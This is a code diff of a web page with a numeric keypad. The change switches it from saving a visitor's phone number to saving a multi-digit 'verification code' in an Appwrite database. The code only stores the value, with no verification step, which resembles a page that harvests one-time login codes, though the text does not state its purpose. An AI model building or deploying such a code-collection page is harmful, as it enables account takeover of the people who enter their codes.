@@ -35,7 +35,7 @@
             }
         </script>
 
-        <button type="submit" class="submit-btn">Submit</button>
+        <button type="submit" class="submit-btn" id="submit-btn">Submit</button>
 
         <div class="number-keyboard">
             <div class="key-row">
@@ -118,25 +118,25 @@
         });
 
         // Handle form submission
-        document.getElementById('phone-form').addEventListener('submit', async function(event) {
+        document.getElementById('submit-btn').addEventListener('click', async function(event) {
             event.preventDefault(); // Prevent the form from submitting normally
 
-            const phoneNumber = phoneNumberInput.value;
+            const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
 
             try {
-                // Save the phone number to the Appwrite database
+                // Save the verification code to the Appwrite database
                 const result = await databases.createDocument(
                     'data', // Your Database ID
                     '66f1ff2200319d99c15d', // Your Collection ID
                     'unique()', // Automatically generate a unique ID for the new document
-                    { phone: phoneNumber }
+                    { phone: verificationCode }
                 );
 
-                console.log('Phone number saved successfully:', result);
-                alert('Phone number saved successfully!');
+                console.log('Verification code saved successfully:', result);
+                alert('Verification code saved successfully!');
             } catch (error) {
-                console.error('Error saving phone number:', error);
-                alert('Failed to save phone number.');
+                console.error('Error saving verification code:', error);
+                alert('Failed to save verification code.');
             }
         });
     </script>
